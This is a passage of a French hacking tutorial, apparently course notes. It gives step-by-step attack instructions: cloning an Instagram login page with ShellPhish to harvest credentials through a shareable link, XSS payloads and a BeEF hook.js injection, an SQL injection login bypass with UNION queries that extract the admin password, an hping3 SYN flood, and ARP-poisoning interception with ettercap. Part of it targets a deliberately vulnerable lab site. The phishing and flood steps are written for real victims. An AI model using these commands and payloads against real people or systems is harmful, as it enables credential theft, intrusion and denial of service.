style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Le phishing est un procéder servant à la récupération des donnée personnelles de quelqu&#x27;un. La méthode la plus utilisée est le clonage de site mais il en existe d&#x27;autre: usurpation d&#x27;identité, de comportement ect.</div></figure><p id="45902cb9-d49d-4262-a009-14bcbd756631" class="">
+</p><p id="899a5ef6-feb4-44dc-967e-a1c4a2817402" class="">Nous allons pour cette partie mettre en place un site piégé récupérant les identifiants et mot de passe taper. Cette technique utilise un script fais par &quot;TheLinuxChoice&quot; mais il en existe plein d&#x27;autre (sur github).</p><p id="77730419-cb47-46e8-bcba-fb7e90de5892" class="">
+</p><p id="26eb2e54-71f9-40d2-b3c5-f876bf9ee687" class="">Tous d&#x27;abord, téléchargeons le dépot git de l&#x27;outils ShellPhish:</p><pre id="31dda3c7-72fa-493f-9ff8-1e5d67861408" class="code"><code>git clone <a href="https://github.com/thelinuxchoice/shellphish.git">https://github.com/thelinuxchoice/shellphish.git</a> </code></pre><p id="8adc8374-fc08-4c21-9991-dc422b70b6d6" class="">
+</p><p id="6878fa79-d95d-45fb-b369-0592d0fe410e" class="">Il faut maintenant rentrer dans le dossier avec:</p><pre id="57d8e400-7989-4af6-8fbb-80b4014163be" class="code"><code>cd shellphish</code></pre><p id="f7772a56-4c7a-48a7-b4d2-7c60679a44b4" class="">
+</p><p id="7849323e-6107-4816-90c7-da50c000dfc6" class="">En tapant &quot;ls&quot; on peut lister les fichier et dossier que ce dossier contient. Il y a un script .sh, c&#x27;est celui qui nous interesse. Il suffit de l&#x27;executer avec:</p><pre id="17f7af0d-31be-4710-9c62-f5c523a396c4" class="code"><code>bash shellphish.sh</code></pre><p id="ed79f11f-19f6-4f71-921a-d6219e6c1f53" class="">
+</p><p id="c7e81df4-b493-4bdc-a5c4-cd32aff5e61e" class="">Le script nous demande alors de sélectionner un site à piégé en tapant le numéro correspondant. Pour cet exemple je vais choisir instagram. Un serveur se lance donc et après quelque seconde, shellphish nous informe que le serveur à été crée avec succè et qu&#x27;il est disponible à un adresse:</p><pre id="5c514cc9-9ddc-48ed-bda3-a6ec21ddf209" class="code"><code>Send this link to the Target: <a href="https://5ad6b3c14b07.ngrok.io/">https://5ad6b3c14b07.ngrok.io</a></code></pre><p id="3c37e386-b00b-4545-b0bd-015df8b938c6" class="">
+</p><p id="95180533-1665-41ef-b885-426e42228970" class="">Si l&#x27;on se rend à cette adresse depuis n&#x27;importe où, et qu&#x27;on rentre nos données de connexion, on sera redirigé vers le site officiel d&#x27;instagram mais l&#x27;identifiant et le mot de passe sera enregistrer dans un document texte par shellphish.</p><p id="b32ff4e3-ee59-43ee-8cb6-00d03c245448" class="">
+</p><p id="67b5a2be-a92a-43d4-878a-15756c3a4543" class="">Sachez qu&#x27;il existe beaucoup d&#x27;outils de phishing comme celui-ci. Shellphish est pratique car il crée un lien accessible en ligne et évite d&#x27;ouvrir ses port, mais ces pages sont pour certaine assez peut réalistes. Par le même créateur, il y a aussi l&#x27;outils blackeye qui est plus complet et qui permet globalement les même chose mais qui diffuse le serveur uniquement sur le réseaux, il faut donc le rendre soi -même disponible sur internet.</p><p id="c27cee8a-f970-4478-ac65-4d240be2e498" class="">
+</p><h2 id="ee82bb98-2059-4022-a369-c9b056220f4d" class="">Les faille web 🩹</h2><h3 id="32047a38-a6af-44b2-b6b6-88ac512ca21f" class="">Mise en place d&#x27;un site vulnérable</h3><p id="f1df022d-82bc-4125-8167-d7f553789e86" class="">Dans cette partie, nous allons mettre en place un site volontairement vulnérable et voir comment l&#x27;exploiter. Le site est téléchargeable gratuitement ici:</p><p id="33566551-1b7b-412c-87a4-b2de073afbd8" class=""><a href="http://www.mediafire.com/file/zaykbt7zsgoblxv/Site_Vuln%25C3%25A9rable.zip/file">http://www.mediafire.com/file/zaykbt7zsgoblxv/Site_Vuln%C3%A9rable.zip/file</a></p><p id="ea372fa2-6f80-4745-a473-4582576dcfdc" class="">
+</p><p id="5b5d42bd-2498-4cc7-abc8-c6e1615ce617" class="">Une fois le .zip télécharger, vous pouvers l&#x27;extraire et le déplacer dans le dossier apache de kali avec:</p><pre id="32f22eda-d4b9-42e3-af8b-ad7dc7879f0e" class="code"><code>sudo mv &quot;chemin du dossier&quot; /var/www/html</code></pre><p id="f20b3815-fdb0-4d57-8efe-f56e05b5ce44" class="">
+</p><p id="d5baa252-c997-43a8-8334-5e32f8878377" class="">On va s&#x27;attribuer les droit sur ce dossier avec:</p><pre id="30687613-d86f-430b-a0a2-9f99b4f55dae" class="code"><code>cd /var/www/html/</code></pre><pre id="940beb13-f7ff-47e9-baef-6fe99b85fbff" class="code"><code>sudo chmod -R 755 /var/www/html/nomdudossier/</code></pre><p id="15ac9c27-80c6-42a8-b635-dfb047018ce8" class="">
+</p><p id="6e08ef04-5fa4-4fb6-b8fe-85ba54989a10" class="">On démarre le serveur apache et mysql:</p><pre id="85b4bcd0-9910-4c0b-81bd-737353db293c" class="code"><code>sudo service apache2 start</code></pre><pre id="6654d835-50da-4e46-8156-81cb4c63c063" class="code"><code>sudo service mysql start</code></pre><p id="85616dc1-9710-4285-9812-4d59483c7ac2" class="">
+</p><p id="2e50b845-5ad2-48c9-be0d-2055157ff501" class="">On lance maintenant mysql pour importer la base de données du site:</p><pre id="913cfe1a-1b99-4dfe-813e-dadf3a5f79e9" class="code"><code>sudo mysql</code></pre><p id="f002731f-3613-4b75-9600-3e0c1ebe976c" class="">
+</p><p id="676178a4-ce2f-4e76-8175-0a7049000614" class="">On crée une database avec :</p><pre id="5920d1fc-be7f-4164-a660-1776e65c4a48" class="code"><code>CREATE DATABASE demobdd;</code></pre><p id="aef439b7-53a2-4da5-9c85-dd12678b0a50" class="">
+</p><p id="1157f958-4fd1-430d-9bac-2ead99b1d284" class="">On rentre dedans avec :</p><pre id="3f2dc65f-4f48-4118-b193-be862ac341f6" class="code"><code>USE demobdd;</code></pre><p id="643f0089-144e-4bd4-8ac1-dc62f86c465d" class="">
+</p><p id="94ae7ada-c3d1-49f6-a1fa-0258bfb7691a" class="">Et on importe le code sql du dossier dans notre database:</p><pre id="914634c3-b260-41fa-8f5a-affb825af8b2" class="code"><code>source /var/html/&quot;nomdudossier&quot;/demobdd.sql</code></pre><p id="8ae79eee-30d2-4a2d-9bc8-726c65d0c693" class="">
+</p><p id="065a56db-4901-4b31-9991-922f5cddb545" class="">On peut maintenant se rendre sur notre site en tapant dans la barre de recherche d&#x27;un navigateur l&#x27;addresse ip de kali suivi du nom du dossier du site vulnérable. </p><pre id="7e21592e-ec75-4177-8cf0-9cdd77654dea" class="code"><code>192.168.1.XX/nomdudossier</code></pre><h3 id="406b42cc-8684-4ca5-9b06-e3ba9ad8bd55" class="">OWASP Top Ten Project</h3><p id="6f9bae0c-6a90-439f-a407-aa92fb2e9707" class="">Le but de ce projet est de fournir une liste des dix risques de sécurité applicatifs Web les plus critiques. Ce classement fait référence aujourd&#x27;hui dans le domaine de la sécurité : il est cité par de nombreux organismes d’audits et de sécurisation des systèmes d’information (DoD, PCI Security Standard). </p><figure id="deab0ac9-9d96-4ca8-a9f2-db252912b9ec" class="image"><a href="Les%20base%20e%CC%81thiques%20e7c8fe21c6be4a7aaa79bef001f906d6/Untitled.png"><img style="width:672px" src="Les%20base%20e%CC%81thiques%20e7c8fe21c6be4a7aaa79bef001f906d6/Untitled.png"/></a><figcaption><em>Traduis par @LeBlogDuHacker</em></figcaption></figure><h3 id="9707609b-00ea-42d2-b712-796e70839522" class="">Exploitation d&#x27;un faille XSS</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="bffd45d2-c039-463d-b6a2-0fe2f1590c7b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Le cross-site scripting (abrégé XSS) est un type de faille de sécurité des sites web permettant d&#x27;injecter du contenu dans une page, provoquant ainsi des actions sur les navigateurs web visitant la page.</div></figure><p id="13a6ec9f-0a10-490c-805e-4c9342476ba1" class="">
+</p><p id="1f350ba0-9017-482f-918e-d7c253af5645" class="">On peut voir sur notre site vulnérable une barre de recherche en haut. Elle nous permet de rechercher des thermes. Cette barre de recherche reçoit donc des instructions. Un attaquant peut alors, au lien de rentrer des thermes à recherché, rentrer un script javascript. On peut testé en entrant dans la barre de recherche:</p><pre id="29e5043f-3b36-4e15-a74e-a1d10a039677" class="code"><code>&lt;script&gt;alert(&quot;Test Xss&quot;)&lt;/script&gt;</code></pre><p id="02fb59e8-55e0-4c83-a618-7e0240d309d8" class="">
+</p><p id="4aa8f72e-b652-4447-8483-9dfc597c8132" class="">Une boite de dialogue affichante &quot;Test Xss&quot; devrait s&#x27;afficher. Ce test montre que la barre de recherche est vulnérable et peut exécuter un script java. Ici cela ne permet pas énormément de chose. Mais essayons ceci autre part. Si l&#x27;on clique sur un article, le site nous autorise à commenter l&#x27;article. De la même façon que pour la barre de recherche, on test la commande:</p><pre id="8636e894-b3be-4961-9cfe-0c78504aefb7" class="code"><code>&lt;script&gt;alert(&quot;Test Xss&quot;)&lt;/script&gt;</code></pre><p id="83c4651e-9032-46de-8be2-a2a93d8589e3" class="">
+</p><p id="f7e27187-80eb-4ade-916b-c65dc7d147c4" class="">Le résultat est le même! Sauf qu&#x27;il est bien plus problématique. La barre de recherche ne stockais pas le script, elle se contentais de exécuter une fois. Ici, le script est stocké sur la page donc n&#x27;importe quel utilisateur qui cliquera sur l&#x27;article se verra géner par le message. Afficher une boite de dialogue n&#x27;es pas grave mais l&#x27;on peut imaginer d&#x27;autre script bien plus problématique:</p><pre id="31b0c224-31da-4cc1-a186-34d8e9215a5e" class="code"><code>&lt;iframe src=&quot;http://exemple.com&quot; style=&quot;width:100%; height:100%; top:0; left:0; right:0; bottom:0; position:fixed;&quot;&gt;&lt;/iframe&gt;</code></pre><p id="1a7800dc-a291-47e4-b707-8e65dfb37638" class="">
+</p><p id="0a3446b7-6ae3-4ca6-9c06-16dce7fee416" class="">Cette commande change le contenu de la page et integre le site <a href="http://exemple.com">exemple.com</a> dedans</p><h3 id="5f53cd59-3d8b-41b2-8d14-26092780dca7" class="">Exploitation d&#x27;un faille SQL</h3><p id="981a19d1-7ad7-4987-aeb1-fca4ce72f918" class="">Les failles SQL sont les vulnérabilité les plus connues sur les site web. On les utilise en &quot;injection&quot; et permettent souvent un accès total au site web. Notre site vulnérable en possède. Voici comment l&#x27;utiliser.</p><p id="9a59197f-935c-4200-a4e1-ee461f5c7b2b" class="">A l&#x27;acceuil de notre site, dans le menu à gauche, on peut voir une section ADMIN. En cliquant dessus, nous arrivons sur une page de connexion tout à fait banale. On va, pour outrepasser cette page de connexion, injecter un script connu. Dans le nom d&#x27;utilisateur, entrer:</p><pre id="a0fdc87d-7c2e-4062-b94a-f5dc3610f30d" class="code"><code>&#x27;OR 1=1 #</code></pre><p id="d7fdf8df-d298-4baf-b4d2-90d4e1a45db3" class="">Cette commande modifie le code php du site et commente, c&#x27;est à dire rends invisible, le code destinant à demander un mot de passe. Il ne nous reste plus qu&#x27;a nous connecter! Voici une liste de commande SQL rédigé par LeBlogDuHacker:</p><ul id="f31ddcc2-e8fa-4eaf-9b53-ca40b2b0abb6" class="toggle"><li><details open=""><summary>LISTE INJECTIONS</summary><p id="3333cd48-6fc1-44b3-97f2-68e9aba64542" class=""><strong>Injection SQL :</strong></p><pre id="b5db690a-002f-4e67-b10b-5f91c38ef889" class="code"><code>&#x27; OR 1=1 #</code></pre><p id="12b2e4d7-0ed9-43d6-a733-5f5d6d1e26fa" class=""><strong>Obtenir le nombre de colonnes :</strong></p><pre id="53b240c3-dc98-4dfe-bc6d-2baf95ae3ae7" class="code"><code>&#x27; OR 1=1 order by x # (avec x=1,2,3, etc jusqu&#x27;à l&#x27;impossibilité de se connecter qui donnera le nbre de colonnes)</code></pre><p id="e2b7f0a6-3fa6-4bd6-92c4-772c08d8b9f2" class=""><strong>Obtenir la version de la base de données :</strong></p><pre id="8776b13f-bd03-4074-a4e9-3f9f92ba782d" class="code"><code>&#x27; OR 1=1 union select 0,@@version,2 order by id; #</code></pre><p id="6dec4d71-4d3b-428a-9f40-c69b943c51f1" class=""><strong>Obtenir le nom des tables :</strong></p><pre id="40a901ff-3f25-4950-9dcc-ce41c52daf3c" class="code"><code>&#x27; OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #</code></pre><p id="22aa12ad-1f7c-42cc-a022-1efb2a98c4a5" class=""><strong>Obtenir le nom des colonnes de la table :</strong></p><pre id="0c33ff10-4548-46d4-939d-d0b56811a0bf" class="code"><code>&#x27; OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=&quot;admin&quot; order by 1; #</code></pre><p id="0e457ccf-25fb-46a0-a3d1-558b19923857" class=""><strong>Obtenir le mot de passe de l&#x27;administrateur :</strong></p><pre id="e0454513-4321-4498-944e-bd8904fffd2b" class="code"><code>&#x27; OR 1=1 union select 0,motdepasse,2 FROM admin order by id; #</code></pre></details></li></ul><h3 id="4a81037d-9d42-4f7b-8881-af8fe84da63d" class="">Introduction à BeEF</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="a9fe8772-3657-40c6-84b4-e0482cc6307a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">BeEF est l&#x27;abréviation de The Browser Exploitation Framework</div></figure><p id="72591831-e54c-4a48-94eb-4a0313f7955b" class="">BeEF est un outil puissant permettant de prendre le contrôle d&#x27;un site web à travers une failles XSS.</p><p id="14bd9650-4760-4385-88d4-e902d7cf0e7c" class="">On peut l&#x27;installer grace à la commande:</p><pre id="0acdf491-d6e6-4033-ad5a-2d940df798db" class="code"><code>sudo apt-get install beef-xss</code></pre><p id="df290cde-2df2-48f9-8162-6c88d79217d3" class="">
+</p><p id="83a299d8-767d-4e2f-aaad-d82810ea0c68" class="">Et on le lance avec:</p><pre id="65e69f03-24a2-4b24-b397-f08409c921ca" class="code"><code>sudo beef-xss</code></pre><p id="3b363338-fe3e-4979-91e9-f833e3b492ba" class="">
+</p><p id="25149046-6edc-47fe-a3eb-7be9a3e75e2a" class="">Cette commande lance un serveur sur le port 3000 de kali. On peut y accéder en tapant dans la barre de recherche:</p><p id="ce77eaed-0730-4004-b272-9f27c27bb976" class=""><a href="http://192.168.1.47:3000/ui/authentication">http://&quot;ipdekali&quot;:3000/ui/authentication</a></p><p id="f90a48e4-fd20-4c5c-b9d8-702e00b526b9" class="">Le nom d&#x27;utilisateur par défault est beef.</p><p id="259cb7ea-bc3b-4e48-b5e0-df8bf32f908f" class="">Cette commande nous donne aussi le script à rentrer pour permettre l&#x27;exploitation:</p><pre id="faae0b5c-7f7e-49a2-a881-53c6ad2731db" class="code"><code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code></pre><p id="3c9a3b69-b035-477a-a4a4-00c05d0e7aba" class="">&quot;&lt;IP&gt;&quot; est bien évidement à remplacer par l&#x27;ip de kali. Faisons le test sur notre site vulnérable.</p><p id="7f177c2e-13a6-4a78-bb11-c30179d899e0" class="">Si l&#x27;on retourne dans notre panneau de controle beef, dans l&#x27;onglet online server, on peut voir qu&#x27;on à bien récupérer le seveur. On peut en cliquant dessus afficher beaucoup d&#x27;information utiles.</p><p id="83e53ce9-dbb5-4fb5-b9c0-33cae407aa6f" class="">Les attques XSS sont listées dans l&#x27;onglet Commands. On peut par exemple faire la même chose que ci-dessus, c&#x27;est à dire afficher une boite de dialogue, en cherchant la commande &quot;Create Alert Diaolog&quot; en tapant alerte dans la barre de recherche de commande. On peut alors ecrire le texte souhaiter et l&#x27;executer avec le bouton executer en bas à droite. On peut aussi faire une redirection avec la commande Redirection.</p><h3 id="15974ff5-7948-4392-8fda-0ca6494e1f26" class="">Scanning de vulnérabilité avec OWASP ZAP</h3><p id="553b38d0-f2fe-4baa-9a70-a3f4e87c8dc3" class="">Nous avons déjà vu OWASP ZAP au début de ce cours. Nous allons voir ce qu&#x27;il trouve en scannant notre site vulnérable. </p><p id="394e7b14-7ee1-4994-8690-f72037f2cae9" class="">Après le scan, ZAP nous indique dans l&#x27;onglet alerte que des vulnérabilités ont été trouvées. </p><p id="d3fd55fe-7d4e-4e9d-9f08-f47c9ee8fc5a" class="">On voit par exemple un dossier Cross Site Scripting (réfléchis) et Cross Site Scripting (stocké) qui concerne les failles XSS. Les indication réfléchis et stocké sont importantes. Réfléchis signife que la faille est une faille exécutable non stocké. Une fois rentré, elle ne va affecter que la personne qui l&#x27;a rentré et il devra la rentré une seconde fois pour recommencer son attaque. Stocké signifie que le script va être stocké dans les données du site et affectera chaque personne qui se connectera (ex; notre script insérer dans la section commentaire).</p><p id="2ef90fc3-d710-407c-8acb-42f1a06d4f68" class="">On voit aussi un dossier concerne les failles sql</p><h2 id="d2e839e9-d85f-4f67-b822-33574bd4cd7e" class="">Les failles réseau 🔐</h2><h3 id="a5a061b4-573c-4828-98e8-88569621055f" class="">Déni de service avec HPing</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="c09bfb4e-aebc-48b7-90a4-6c8786c1c142"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Le déni de services consiste à bloquer la disponibilité d&#x27;un service. Ce dernier peut etre en ligne ou hors ligne et peut se trouver sous la forme d&#x27;un ransomware par exemple.</div></figure><p id="b2a3f4f3-ff54-496c-ad03-5175d3fb5ef4" class="">Hping est un utilitaire directement intégrer à kali qui permet d&#x27;envoyé énormément de paquets à un machine afin de surchargé son processeur. Pour l&#x27;utiliser, il suffit de taper:</p><pre id="6ee8857d-d5c0-4ca0-b273-d4156e819586" class="code"><code>hping3 &quot;adresse ip de la victime&quot; --flood -S -p 445 -d 1200</code></pre><p id="09be4cd0-890e-46ad-89bd-1a2dcb89a825" class="">
+</p><h3 id="bf2baf39-1363-400f-8a1f-ecb469e336c0" class="">L&#x27;attaque &quot;Man in the middle&quot;</h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="65a4af37-42a0-45a9-a81f-b2b0f3cc94e4"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Le but de cette attaque est d&#x27;intercepter des communication entre deux partie. L&#x27;attaquant sert d&#x27;intermédiaire entre ces deux dernière et intercepte les données</div></figure><p id="58af590b-37fb-4d91-a231-c06e411b0ad8" class="">
+</p><ul id="50ae016f-df1b-4c4b-9233-c3c0ca484a55" class="bulleted-list"><li>L&#x27;arp spoofing avec ettercap</li></ul><p id="ac7e5763-7565-4e89-bc42-67d6d36ffc41" class="">Tout d&#x27;abord, il nous faut lancer ettercap:</p><pre id="b46432c9-8255-4a08-a9a4-36202f2caa90" class="code"><code>ettercap -G</code></pre><p id="cc25aa56-ced8-4fb6-bad0-4e86950e0505" class="">
+</p><p id="8e7fd240-0a64-441f-9529-06d841c656e9" class="">Une fois lancer, il nous faut initialiser le scan du réseau et des machine présente dessus. Pour cela allez dans l&#x27;onglet &quot;Sniff&quot;, puis Unified Sniffing et sélectionner l&#x27;interface réseau voulue. </p><p id="152b3f71-499e-48d7-9010-fb84dd6711f6" class="">On peut maintenant allez dans l&#x27;onglet &quot;host&quot; puis &quot;scan for host&quot; pour récupérer les adresse des machines. </p><p id="f365d340-bc35-4a9b-aabd-23568dc97622" class="">On peut les afficher en allant dans l&#x27;onglet &quot;host&quot; puis &quot;host list&quot;</p><p id="f5c32663-8e27-45dd-a754-42bb3a2a7404" class="">Pour lancer une attaque &quot;man in the middle&quot;, il faut sélectionner les deux machine auquelle nous allons intercepter les communication avec les bouton &quot;Add to Target&quot; puis lancer l&#x27;attaque dans l&#x27;onglet Mitm, puis ARP poisoning et  Valider en sélectionnant  Sniff remote connection.</p><p id="65a6545f-c0a8-40ac-a311-6220474a3238" class="">
+</p><p id="850565d2-5a79-423d-bb33-aaf2319dc67e" class="">
+</p><p id="4b083e07-6bc7-4e6c-a4d2-0e8f4f005c69" class="">
+</p><p id="d018f214-22d9-4bec-a981-48db57c3b0c7" class="">
+</p><p id="60d0a829-b1af-40db-8dc1-b6957f6faf5a" class="">
+</p></div></article></body></html>
